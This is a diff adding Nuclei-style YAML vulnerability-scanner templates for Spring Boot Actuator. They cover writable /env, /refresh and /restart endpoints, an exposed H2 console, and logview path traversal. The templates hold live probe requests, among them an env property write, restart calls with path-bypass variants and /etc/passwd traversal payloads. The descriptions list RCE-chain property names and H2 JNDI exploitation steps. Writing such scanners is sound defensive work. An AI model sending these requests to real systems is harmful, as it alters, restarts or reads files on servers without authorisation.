@@ -1,0 +1,279 @@
+id: springboot-env-rce-chains
+
+info:
+  name: Spring Boot Actuator - RCE Chain Prerequisites Detection
+  author: Shafranpackeer
+  severity: high
+  description: |
+    Detects when Spring Boot Actuator has the prerequisites for RCE exploitation chains:
+
+    1. POST to /env + /refresh available:
+       - eureka.client.serviceUrl.defaultZone → XStream deserialization RCE
+       - spring.cloud.bootstrap.location → SnakeYAML RCE
+       - spring.datasource.url → JDBC deserialization RCE
+
+    2. POST to /env + /restart available:
+       - logging.config → Logback JNDI/Groovy RCE
+       - spring.main.sources → Groovy RCE
+       - spring.datasource.data → H2 Database RCE
+       - spring.datasource.hikari.connection-test-query → H2 RCE
+
+    This template detects if these endpoints accept POST requests,
+    indicating potential for property manipulation attacks.
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+    - https://github.com/LandGrey/SpringBootVulExploit
+    - https://github.com/pyn3rd/Spring-Boot-Vulnerability
+  metadata:
+    max-request: 12
+    verified: true
+  tags: springboot,rce,env,refresh,restart,exploitation,intrusive
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-94,CWE-502
+
+http:
+  # ============================================
+  # Check if /env accepts POST (property modification)
+  # ============================================
+  - raw:
+      - |
+        POST /actuator/env HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name":"test.property","value":"test"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - "test.property"
+          - '"value"'
+          - "propertySources"
+        condition: or
+        negative: false
+
+    extractors:
+      - type: kval
+        name: env-post-allowed
+        kval:
+          - content_type
+
+---
+id: springboot-refresh-available
+
+info:
+  name: Spring Boot Actuator /refresh - RCE Chain Component
+  author: Shafranpackeer
+  severity: medium
+  description: |
+    Detects if /refresh endpoint is available.
+    When combined with writable /env, enables RCE via:
+    - eureka.client.serviceUrl.defaultZone (XStream deser)
+    - spring.cloud.bootstrap.location (SnakeYAML deser)
+    - spring.datasource.url (JDBC deser)
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+  metadata:
+    max-request: 6
+    verified: true
+  tags: springboot,refresh,rce-prerequisite
+
+http:
+  - raw:
+      - |
+        POST /actuator/refresh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+
+      - |
+        POST /refresh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+
+      - |
+        POST /actuator;/refresh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - "[]"
+          - "scope"
+          - "refresh"
+        condition: or
+
+---
+id: springboot-restart-available
+
+info:
+  name: Spring Boot Actuator /restart - RCE Chain Component
+  author: Shafranpackeer
+  severity: medium
+  description: |
+    Detects if /restart endpoint is available.
+    When combined with writable /env, enables RCE via:
+    - logging.config (Logback JNDI injection)
+    - spring.main.sources (Groovy code execution)
+    - spring.datasource.data (H2 SQL injection)
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+  metadata:
+    max-request: 6
+    verified: true
+  tags: springboot,restart,rce-prerequisite
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/actuator/restart"
+      - "{{BaseURL}}/restart"
+      - "{{BaseURL}}/actuator;/restart"
+      - "{{BaseURL}}/%61ctuator/restart"
+
+    headers:
+      Content-Type: application/json
+
+    body: "{}"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - '"message"'
+          - "restarting"
+          - '"status"'
+        condition: or
+
+---
+id: springboot-h2-console-rce
+
+info:
+  name: Spring Boot H2 Console - JNDI RCE Vector
+  author: Shafranpackeer
+  severity: critical
+  description: |
+    Detects exposed H2 database console which can be exploited for RCE
+    via JNDI injection when spring.h2.console.enabled=true.
+
+    Exploitation:
+    1. Access /h2-console/login.jsp to get jsessionid
+    2. POST malicious JDBC driver with JNDI payload
+    3. H2 performs JNDI lookup → RCE
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+    - https://www.exploit-db.com/exploits/49295
+  metadata:
+    max-request: 8
+    verified: true
+  tags: springboot,h2,console,jndi,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/h2-console"
+      - "{{BaseURL}}/h2-console/"
+      - "{{BaseURL}}/h2-console/login.jsp"
+      - "{{BaseURL}}/h2"
+      - "{{BaseURL}}/h2/"
+      - "{{BaseURL}}/database"
+      - "{{BaseURL}}/db"
+      - "{{BaseURL}}/console"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "H2 Console"
+          - "Login"
+          - "JDBC URL"
+          - "h2-console"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+---
+id: springboot-logview-lfi
+
+info:
+  name: Spring Boot Actuator Logview - Path Traversal (CVE-2021-21234)
+  author: Shafranpackeer
+  severity: high
+  description: |
+    spring-boot-actuator-logview versions before 0.2.13 are vulnerable to
+    path traversal allowing arbitrary file read.
+  reference:
+    - https://github.com/marcinguy/CVE-2021-21234
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-21234
+  metadata:
+    max-request: 6
+    verified: true
+  tags: springboot,logview,lfi,cve,cve2021,cve-2021-21234
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../"
+      - "{{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../"
+      - "{{BaseURL}}/actuator/log/view?filename=/etc/passwd&base=../../../../../"
+      - "{{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../"
+      - "{{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../"
+      - "{{BaseURL}}/actuator/log/view?filename=....//....//....//....//etc/passwd"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: or
